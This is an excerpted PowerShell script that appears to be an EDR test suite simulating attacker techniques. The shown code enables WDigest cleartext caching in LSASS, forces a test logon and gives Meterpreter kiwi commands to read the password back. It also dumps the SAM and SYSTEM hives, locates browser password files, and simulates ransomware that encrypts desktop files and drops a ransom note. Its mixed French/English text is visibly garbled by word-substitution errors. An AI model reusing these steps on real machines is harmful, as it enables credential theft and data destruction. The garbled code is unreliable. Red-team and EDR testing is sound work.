...
#  Usage: powershell -ep bypass -Fithe edr_master_suite.ps1
...
function Test-Recon {
    ...
    # System info
    Write-Detail "Running: Get-CimInstance -ClassName Win32_ComputerSystem + Win32_OperatingSystem"
...
function Test-Credentials {
    ...
    # Tracker pour the rapport final
    $mod2 = @{
        WDigest        = "NOT_TESTED"
        WDigestUser    = ""
        WDigestPass    = ""
    ...
    #  in LSASS memory if WDigest is active.
    #  Why: Legacy authentication protocol that requires
    #  the cleartext password to generate MD5 hashes.
    # ============================================================
    Write-Host ""
    ...
    Write-Host "  |  Objective : Enable password caching  |" -ForegroundColor DarkGray
    Write-Host "  |              in cleartext in LSASS                 |" -ForegroundColor DarkGray
    Write-Host "  +--------------------------------------------------+" -ForegroundColor DarkRed
    Write-Host ""

    Write-Host "  WHY WDigest?" -ForegroundColor White
    Write-Host "  Windows stores credentials as hash (NTLM) by default." -ForegroundColor Gray
    Write-Host "  With WDigest enabled, the CLEARTEXT password is also" -ForegroundColor Gray
    Write-Host "  cached in LSASS for legacy network authentication." -ForegroundColor Gray
    Write-Host "  An attacker can then read this cache with Mimikatz." -ForegroundColor Gray
    Write-Host ""

    Write-Host "  COMMAND EXECUTED:" -ForegroundColor White
    ...
    Write-Host "  Value before modification: $wdBefore" -ForegroundColor Gray
    ...
    Write-Host "  Value after modification: $wdAfter" -ForegroundColor $(if($wdAfter -eq 1){"Green"}else{"Red"})

    if ($wdAfter -eq 1) {
        Write-Host ""
        Write-Host "  [+] RESULT: WDigest ACTIVE" -ForegroundColor Green
        ...
        Write-Host "  [-] RESULT: WDigest BLOCKED par l'EDR" -ForegroundColor Red
    ...
    #  que WDigest capture bien the mot de passe en clair
    # ============================================================
    Write-Host ""
    Write-Host "  +--------------------------------------------------+" -ForegroundColor DarkRed
    Write-Host "  |  SECTION B -- Test User Creation + Force Logon   |" -ForegroundColor Red
    ...
    Write-Host "  WHY a test user?" -ForegroundColor White
    Write-Host "  WDigest only caches credentials AFTER a logon." -ForegroundColor Gray
    Write-Host "  Create a user with a known password, force" -ForegroundColor Gray
    Write-Host "  a programmatic logon, then verify that" -ForegroundColor Gray
    Write-Host "  Mimikatz returns exactly this password." -ForegroundColor Gray
    Write-Host ""
    ...
    Try {
        ...
        Write-Host "      Password    : $wdPass  <-- should appear in CLEARTEXT in LSASS" -ForegroundColor Red
...
public class LogonSim {
    ...
    public static string Logon(string u, string d, string p, int t) {
        ...
        if (ok) { bool imp = ImpersonateLoggedOnUser(tok); RevertToSelf(); CloseHandle(tok);
                  return "SUCCESS type=" + t + " impersonnification=" + imp; }
        return "FAILURE type=" + t + " erreur=" + err + " (" + (err==1326?"BadPassword":err==5?"AccessDenied":"Unknown") + ")";
    }
}
"@ -ErrorAction SilentlyContinue
    ...
    Write-Host ""
    if ($logonSuccess) {
        Write-Host "  [+] RESULT: Cache LSASS populee" -ForegroundColor Green
        Write-Host "      The password '$wdPass' est maintenant in cleartext in LSASS" -ForegroundColor Green
        Write-Host "      Verification with Meterpreter:" -ForegroundColor White
        Write-Host "        meterpreter > load kiwi" -ForegroundColor Cyan
        Write-Host "        meterpreter > creds_all" -ForegroundColor Cyan
        Write-Host "        Look for: $wdUser : $wdPass" -ForegroundColor Yellow
        Log-Result "T1003.001" "WDigest logon cache populated" "EXECUTED" "User:$wdUser Pass cached in LSASS"
    } else {
        Write-Host "  [-] RESULT: Logon blocked -- cache not populated" -ForegroundColor Red
    ...
    Write-Host ""
    Write-Host "  +--------------------------------------------------+" -ForegroundColor DarkRed
    Write-Host "  |  SECTION C -- LSASS Process Access              |" -ForegroundColor Red
    Write-Host "  |  Technique : T1003.001                           |" -ForegroundColor DarkGray
    Write-Host "  |  Objectif  : Verifier l'accessibilite de LSASS  |" -ForegroundColor DarkGray
    Write-Host "  +--------------------------------------------------+" -ForegroundColor DarkRed
    Write-Host ""

    Write-Host "  WHY LSASS?" -ForegroundColor White
    Write-Host "  LSASS (Local Security Authority Subsystem Service)" -ForegroundColor Gray
    Write-Host "  is the Windows process that manages all" -ForegroundColor Gray
    Write-Host "  authentications. Mimikatz reads its memory to" -ForegroundColor Gray
    Write-Host "  extract cached credentials." -ForegroundColor Gray
    Write-Host ""
    Write-Host "  COMMAND EXECUTED:" -ForegroundColor White
    ...
    #  chiffree avec la cthe SYSKEY dans la ruche SYSTEM
    # ============================================================
    Write-Host ""
    Write-Host "  +--------------------------------------------------+" -ForegroundColor DarkRed
    Write-Host "  |  SECTION D -- SAM + SYSTEM Hive Dump             |" -ForegroundColor Red
    Write-Host "  |  Technique : T1003.002                           |" -ForegroundColor DarkGray
    Write-Host "  |  Objective : Extract local NTLM hashes      |" -ForegroundColor DarkGray
    Write-Host "  +--------------------------------------------------+" -ForegroundColor DarkRed
    Write-Host ""

    Write-Host "  WHY SAM + SYSTEM?" -ForegroundColor White
    ...
    if ($samOk -and $systemOk) {
        ...
        Write-Host "  [+] HIVES DUMPEES AVEC SUCCESS:" -ForegroundColor Green
        Write-Host ""
...
"@
    ...
    Write-Host "  |  Objectif  : Locate password files for  |" -ForegroundColor DarkGray
    Write-Host "  |              passe des navigateurs               |" -ForegroundColor DarkGray
    Write-Host "  +--------------------------------------------------+" -ForegroundColor DarkRed
    Write-Host ""

    Write-Host "  WHY browsers?" -ForegroundColor White
    ...
    if ($mod2.WDigest -eq "EXECUTED") {
        ...
        Write-Host "          Statut   : BLOCKED par CrowdStrike" -ForegroundColor Green
    ...
    if ($mod2.SAMDump -eq "EXECUTED") {
        ...
        Write-Host "          Statut   : BLOCKED -- privileges insuffisants ou EDR" -ForegroundColor Green
...
function Test-Ransomware {
    ...
    # Create victim files ON DESKTOP in a visible folder
    Write-Detail "Creating victim files on Desktop..."
    $desktopPath = [Environment]::GetFolderPath("Desktop")
    $testDir = "$desktopPath\ENCRYPTED_FILES_DEMO"
    New-Item -ItemType Directory -Force -Path $testDir | Out-Null

    Write-Host ""
    Write-Host "  === FILES LOCATION ===" -ForegroundColor Yellow
    Write-Host "  📁 Desktop\ENCRYPTED_FILES_DEMO" -ForegroundColor Cyan
    Write-Host "  Full Path: $testDir" -ForegroundColor Gray
    Write-Host ""

    $files = @{
        "Financial_Report_Q1.txt" = "FINANCIAL REPORT Q1 2024`nRevenue: 4,250,000$`nMargin: 18.3%`nCONFIDENTIAL"
        "Customer_List.csv"       = "Name,Email,Phone`nTremblay,jean@corp.com,514-555-0101`nLeblanc,marie@corp.com,438-555-0202"
        "Server_Credentials.txt"  = "SRV-PROD: admin/P@ssw0rd2024!`nDB: sa/Sql$ecret99`nVPN: user/Winter2024#"
        "Strategic_Plan.txt"      = "ACQUISITION: CompetitorCo`nBudget: 12M$`nTimeline: Q3 2024`nCONFIDENTIAL"
        "AWS_Keys.txt"            = "AWS_KEY=AKIAIOSFODNN7EXAMPLE`nAWS_SECRET=wJalrXUtnFEMI/K7MDENG"
    }
    
    Write-Host "  === ORIGINAL FILES CREATED ===" -ForegroundColor Yellow
    foreach ($f in $files.GetEnumerator()) {
        Set-Content "$testDir\$($f.Key)" $f.Value
        $fileSize = (Get-Item "$testDir\$($f.Key)").Length
        Write-Evidence "✓ $($f.Key) ($fileSize bytes)"
    }
    ...
    Write-Host "  === FILE ENCRYPTION PROCESS ===" -ForegroundColor Yellow
    ...
    Get-ChildItem $testDir -File | ForEach-Object {
        ...
        Write-Evidence "🔒 ENCRYPTED: $($_.Name) → $($_.Name).locked"
        $count++
        $script:RansomCount++
    }
    
    Write-Host ""
    Write-Host "  === ENCRYPTED FILES ON YOUR DESKTOP ===" -ForegroundColor Cyan
    Write-Host "  📁 Location: Desktop\ENCRYPTED_FILES_DEMO" -ForegroundColor Green
    Write-Host "  📂 Full Path: $testDir" -ForegroundColor DarkGray
    Write-Host ""
    ...
    if ($count -gt 0) {
        ...
        Log-Result "T1486" "File encryption simulation" "EXECUTED" "$count files encrypted - CHECK DESKTOP!"
    } else {
        Log-Result "T1486" "File encryption simulation" "BLOCKED" "No files encrypted"
    }

    # Ransom note - placed in encrypted folder on Desktop
    Write-Host ""
    Write-Detail "Dropping ransom note in encrypted files folder..."
    Write-Host ""
...
"@
    ...
    $notePath = "$testDir\!!! READ_ME_RANSOM !!!.txt"
    Set-Content $notePath $note
    Write-Evidence "📄 Ransom note created: !!! READ_ME_RANSOM !!!.txt"
    Write-Host "  ✓ Ransom note placed in: Desktop\ENCRYPTED_FILES_DEMO" -ForegroundColor Cyan
...
"@ -ErrorAction SilentlyContinue
            ...
            if ($resA) { $wallpaperSet = $true; Write-OK "Method A SUCCESSS" }
...
"@ -ErrorAction SilentlyContinue
    ...
    # FINAL SUMMARY - Show where files are
    Write-Host ""
    Write-Host "╔════════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║                      🚨 RANSOMWARE SIMULATION COMPLETE 🚨                      ║" -ForegroundColor Green
    Write-Host "╚════════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    Write-Host ""
    Write-Host "  📁 YOUR ENCRYPTED FILES ARE HERE:" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "     📂 Desktop\ENCRYPTED_FILES_DEMO" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  Full Path:" -ForegroundColor White
    Write-Host "     $testDir" -ForegroundColor DarkYellow
    Write-Host ""
    Write-Host "  Files encrypted:" -ForegroundColor White
    Get-ChildItem $testDir | ForEach-Object { 
        Write-Host "     🔐 $($_.Name)" -ForegroundColor Red
    }
    Write-Host ""
    Write-Host "  Summary:" -ForegroundColor White
    Write-Host "     ✓ $script:RansomCount files encrypted with .locked extension" -ForegroundColor Yellow
    Write-Host "     ✓ Ransom note created: !!! READ_ME_RANSOM !!!.txt" -ForegroundColor Yellow
    Write-Host "     ✓ XOR encryption applied (key: 0x42)" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  💡 To decrypt files: Change extension from .locked back to original" -ForegroundColor Cyan
    Write-Host "  💡 This is a simulation only - no real harm to test files" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "═════════════════════════════════════════════════════════════════════════════════" -ForegroundColor Green
    Write-Host ""
}
...
function Test-Obfuscation {
    ...
    Try {
        ...
        Write-Evidence "SecureString roundtrip: $(if($dec2 -eq $target){'SUCCESSS'}else{'FAILED'})"
...
function Test-SandboxEvasion {
    ...
    $checks = @(
        ...
        @{ Name="CPU cores <= 2"; Check={
            $c = (Get-CimInstance -ClassName Win32_Processor).NumberOfCores
            if ($c -le 2) { return "$c cores" }
            return $null
        }},
        @{ Name="RAM < 4GB"; Check={
            $r = [math]::Round((Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)
        ...
        @{ Name="VM model string"; Check={
            $m = (Get-CimInstance -ClassName Win32_ComputerSystem).Model
        ...
        @{ Name="Uptime < 10 min"; Check={
            $up = (Get-Date)-(Get-CimInstance -ClassName Win32_OperatingSystem).ConvertToDateTime((Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime)
...
function Test-EICAR {
    ...
    # La chaine EICAR officielthe (assemblee en morceaux pour eviter
    # que the script lui-meme soit flagge avant execution)
    $e1 = "X5O"
    $e2 = "!P%@AP"
    $e3 = "[4\PZX5"
    $e4 = "4(P^)7CC"
...
function Test-JavaRhino {
    ...
    # -- Verifier Java instalthe et version --
    ...
    # -- Generer the resource script Metasploit --
    Write-Host ""
...
"@
    ...
    # -- Generer the payload HTML pour le browser victime --
    ...
    # -- Verifier Java dans the browser victime --
...
#  Ordre critique: WDigest AVANT the logon
...
function Test-WDigestDemo {
    ...
    # -- STEP 3: Forcer the logon APRES activation WDigest --
    Write-Host ""
...
public class WDigestLogon {
    ...
    public static string Logon(string user, string domain, string pass, int type) {
        ...
        if (ok) {
            ...
            RevertToSelf();
            CloseHandle(token);
            return "SUCCESSS type=" + type + " impersonated=" + imp;
        }
...
"@ -ErrorAction SilentlyContinue
    ...
    foreach ($logonType in @(2, 8, 9)) {
        ...
        Try {
            ...
            Write-Evidence "  $r"
            if ($r -match "SUCCESSS") { $anySuccess = $true }
        } Catch {
...
#  Remet the systeme dans l etat initial
...
function Invoke-Revert {
    ...
    # -- 10. BCDEDIT -- re-enabthe recovery --
    ...
    # -- 12. WALLPAPER -- restaurer the wallpaper original --
    Write-Detail "Restoring wallpaper..."
    Try {
        # Essayer de recuperer the wallpaper original depuis TranscodedWallpaper
        $originalPaths = @(
...
#  T1480  -- Execution Guardrails (fithe lock)
# ============================================================
...
function Test-FileSelfProtection {
    ...
    Try {
        ...
        # Tenter de supprimer the fichier verrouille
        ...
        # Tenter de modifier the fichier depuis un autre contexte
    ...
    #  TEST 13D: Multipthe handles (resilience) 
    Write-Host ""
    ...
    #  TEST 13G: EDR handthe force-close detection 
    Write-Host ""
    ...
    Try {
        ...
        # Attendre un peu et verifier si the handle est toujours valide
        Start-Sleep -Seconds 2
